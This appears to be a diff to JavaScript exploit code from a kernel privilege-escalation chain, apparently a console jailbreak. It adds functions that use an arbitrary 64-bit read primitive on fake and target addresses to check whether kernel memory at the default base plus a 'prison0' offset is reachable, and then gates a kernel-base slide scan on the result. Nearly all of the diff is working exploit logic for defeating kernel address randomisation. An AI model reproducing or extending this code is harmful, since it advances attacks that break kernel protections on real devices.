@@ -526,7 +526,7 @@ var SURVIVE_MS = (function(){
 })();
 var FORCE_UCRED_SIG_SCAN = Q.get("ksig") === "1";
 
-var REVISION = "genuine-u8-rw-21-1352";
+var REVISION = "genuine-u8-rw-22-1352";
 var K = 2;
 var DUPLICATE_INDEX = 2;
 var CONTROL_INDEX = 0xffff;
@@ -729,6 +729,39 @@ function kbaseCandidateValid(base, weak) {
     return true;
 }
 
+function probeKernelArwReachability() {
+    mark("KARW-PROBE-BEGIN", FW_LABEL || "unknown-fw");
+    var userVal = 0n;
+    if (isFinite(fakeAddress) && fakeAddress > 0) {
+        userVal = read64(BigInt(Math.floor(fakeAddress)));
+        mark("KARW-USER-FAKE", hex(userVal));
+    } else if (isFinite(targetAddress) && targetAddress > 0) {
+        userVal = read64(BigInt(Math.floor(targetAddress)));
+        mark("KARW-USER-TARGET", hex(userVal));
+    }
+    if (fwOffsets && fwOffsets.prison0 != null) {
+        var kva = KBASE_DEFAULT + BigInt(fwOffsets.prison0);
+        var kval = read64(kva);
+        mark("KARW-KERN-PRISON", "va=" + hex(kva) + "-val=" + hex(kval));
+        var kva2 = 0xffffffff82200000n + BigInt(fwOffsets.prison0);
+        mark("KARW-KERN-PRISON2", hex(read64(kva2)));
+        if (userVal !== 0n && kval === userVal) {
+            mark("KARW-ALIAS-WARN", "kern-read-matches-user-fake");
+        }
+        mark("KARW-PROBE-END", kptrBig(kval) ? "kptr-at-default+prison0" : "no-kptr");
+    } else {
+        mark("KARW-PROBE-END", "no-offsets");
+    }
+}
+
+function kernelArwLikely() {
+    var bases = [KBASE_DEFAULT].concat(KBASE_LINK_BASES);
+    for (var i = 0; i < bases.length; i++) {
+        if (kbaseScoreSample(kbaseSampleAt(bases[i])) > 0) return true;
+    }
+    return false;
+}
+
 function kbaseScanProbeSummary() {
     var probes = [KBASE_DEFAULT].concat(KBASE_LINK_BASES);
     var parts = [];
@@ -758,6 +791,16 @@ function resolveKbaseAsync(done) {
     if (!fwOffsets || fwOffsets.prison0 == null) {
         mark("KBASE-SCAN-SKIP", "no-fw-offsets");
         done(KBASE_DEFAULT);
+        return;
+    }
+
+    probeKernelArwReachability();
+    if (!kernelArwLikely() && Q.get("kbforce") !== "1") {
+        mark("KBASE-SCAN-SKIP", "arw-not-kernel-visible");
+        mark("KBASE-NOTE", "slide-scan-needs-kernel-read-or-kptr-leak");
+        mark("KBASE-NOTE2", "try-poops-jit-chain-or-kbscan=0-blind-stub");
+        kbaseScanProbeSummary();
+        done(null);
         return;
     }
 
